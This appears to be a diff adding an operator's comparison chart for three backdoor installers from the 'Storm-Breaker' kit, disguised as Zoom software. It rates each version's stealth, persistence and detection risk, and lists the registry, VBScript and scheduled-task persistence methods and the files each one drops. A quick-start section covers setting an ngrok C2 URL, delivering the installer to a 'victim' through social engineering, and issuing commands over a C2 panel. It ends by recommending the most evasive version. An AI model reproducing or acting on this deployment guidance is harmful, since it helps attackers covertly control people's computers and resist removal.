@@ -1,0 +1,119 @@
+╔════════════════════════════════════════════════════════════════════════════════╗
+║                    STORM-BREAKER BACKDOOR COMPARISON                           ║
+╚════════════════════════════════════════════════════════════════════════════════╝
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Feature Comparison                                                             │
+├─────────────────────────┬──────────────┬──────────────┬──────────────────────┤
+│ Feature                 │ Original     │ Silent       │ Task Scheduler       │
+│                         │ Setup.bat    │ Setup.bat    │ Setup.bat            │
+├─────────────────────────┼──────────────┼──────────────┼──────────────────────┤
+│ Visible Window          │ Minimized    │ Hidden       │ Hidden               │
+│ Persistence             │ ❌ None      │ ✅ Registry  │ ✅ Registry + Tasks  │
+│ Survives Reboot         │ ❌ No        │ ✅ Yes       │ ✅ Yes               │
+│ Auto-Restart on Crash   │ ❌ No        │ ❌ No        │ ✅ Yes (every 5min)  │
+│ Self-Deletes Installer  │ ❌ No        │ ✅ Yes       │ ✅ Yes               │
+│ Stealth Level           │ ⭐ Low       │ ⭐⭐⭐ Med   │ ⭐⭐⭐⭐⭐ High      │
+│ Persistence Level       │ ⭐ None      │ ⭐⭐⭐ High  │ ⭐⭐⭐⭐⭐ Maximum   │
+│ Complexity              │ ⭐ Simple    │ ⭐⭐ Medium  │ ⭐⭐⭐ Advanced      │
+│ Detection Risk          │ ⭐⭐⭐⭐ High│ ⭐⭐ Medium  │ ⭐ Low               │
+└─────────────────────────┴──────────────┴──────────────┴──────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Persistence Mechanisms                                                         │
+├─────────────────────────┬──────────────┬──────────────┬──────────────────────┤
+│ Mechanism               │ Original     │ Silent       │ Task Scheduler       │
+├─────────────────────────┼──────────────┼──────────────┼──────────────────────┤
+│ Registry Startup        │ ❌           │ ✅           │ ✅                   │
+│ VBScript Launcher       │ ❌           │ ✅           │ ❌                   │
+│ Scheduled Task (Logon)  │ ❌           │ ❌           │ ✅                   │
+│ Scheduled Task (Timed)  │ ❌           │ ❌           │ ✅ (Every 5 min)     │
+│ Elevated Privileges     │ ❌           │ ❌           │ ✅                   │
+└─────────────────────────┴──────────────┴──────────────┴──────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Use Case Recommendations                                                       │
+├────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                │
+│ 🧪 TESTING & DEBUGGING                                                        │
+│    → Use: ZoomConsole_Setup.bat (Original)                                    │
+│    → Why: Easy to see, stop, and restart. No cleanup needed.                  │
+│                                                                                │
+│ 🎯 STANDARD DEPLOYMENT                                                        │
+│    → Use: ZoomConsole_Setup_Silent.bat                                        │
+│    → Why: Good balance of stealth and simplicity. Persists across reboots.    │
+│                                                                                │
+│ 🔒 MAXIMUM PERSISTENCE                                                        │
+│    → Use: ZoomConsole_Setup_TaskScheduler.bat                                 │
+│    → Why: Multiple persistence mechanisms. Auto-restarts. Hardest to remove.  │
+│                                                                                │
+│ 🚀 RED TEAM OPERATIONS                                                        │
+│    → Use: ZoomConsole_Setup_TaskScheduler.bat                                 │
+│    → Why: Professional-grade persistence. Survives most cleanup attempts.     │
+│                                                                                │
+└────────────────────────────────────────────────────────────────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Quick Start Guide                                                              │
+├────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                │
+│ 1. Choose your version based on requirements above                            │
+│                                                                                │
+│ 2. Update the SERVER URL in the .bat file:                                    │
+│    set "SERVER=https://your-ngrok-url.ngrok-free.dev"                         │
+│                                                                                │
+│ 3. Deploy to target:                                                          │
+│    • Direct execution (victim runs .bat file)                                 │
+│    • Via Storm-Breaker web panel download                                     │
+│    • Social engineering package                                               │
+│                                                                                │
+│ 4. Verify connection in Storm-Breaker dashboard                               │
+│                                                                                │
+│ 5. Issue commands via C2 panel                                                │
+│                                                                                │
+└────────────────────────────────────────────────────────────────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Files Created on Target System                                                │
+├─────────────────────────┬──────────────┬──────────────┬──────────────────────┤
+│ File Location           │ Original     │ Silent       │ Task Scheduler       │
+├─────────────────────────┼──────────────┼──────────────┼──────────────────────┤
+│ Installer .bat          │ ✅ Remains   │ ❌ Deleted   │ ❌ Deleted           │
+│ ZoomService.ps1         │ ❌           │ ✅           │ ✅                   │
+│ ZoomUpdate.vbs          │ ❌           │ ✅           │ ❌                   │
+│ Registry Entry          │ ❌           │ ✅           │ ✅                   │
+│ Scheduled Tasks         │ ❌           │ ❌           │ ✅ (2 tasks)         │
+└─────────────────────────┴──────────────┴──────────────┴──────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ Detection & Removal Difficulty                                                │
+├─────────────────────────┬──────────────┬──────────────┬──────────────────────┤
+│ Detection Method        │ Original     │ Silent       │ Task Scheduler       │
+├─────────────────────────┼──────────────┼──────────────┼──────────────────────┤
+│ Visible Window          │ ✅ Easy      │ ❌ Hidden    │ ❌ Hidden            │
+│ Task Manager            │ ✅ Obvious   │ ⚠️ Visible   │ ⚠️ Visible           │
+│ Startup Programs        │ ❌ Not there │ ✅ Visible   │ ✅ Visible           │
+│ Task Scheduler          │ ❌ Not there │ ❌ Not there │ ✅ Visible           │
+│ Network Monitoring      │ ✅ Detectable│ ✅ Detectable│ ✅ Detectable        │
+│ Antivirus               │ ⚠️ Maybe     │ ⚠️ Maybe     │ ⚠️ Maybe             │
+├─────────────────────────┼──────────────┼──────────────┼──────────────────────┤
+│ Removal Difficulty      │ ⭐ Trivial   │ ⭐⭐⭐ Medium│ ⭐⭐⭐⭐ Hard         │
+└─────────────────────────┴──────────────┴──────────────┴──────────────────────┘
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│ ⚠️  IMPORTANT NOTES                                                            │
+├────────────────────────────────────────────────────────────────────────────────┤
+│                                                                                │
+│ • All versions require victim to execute the .bat file                        │
+│ • PowerShell execution policy must allow scripts (usually default)            │
+│ • Antivirus may flag any version (test in controlled environment)             │
+│ • Network activity is visible to monitoring tools                             │
+│ • Always have proper authorization before deployment                          │
+│ • Provide removal instructions to authorized clients                          │
+│                                                                                │
+└────────────────────────────────────────────────────────────────────────────────┘
+
+═══════════════════════════════════════════════════════════════════════════════
+                        RECOMMENDED: Task Scheduler Version
+                     For maximum persistence and stealth
+═══════════════════════════════════════════════════════════════════════════════
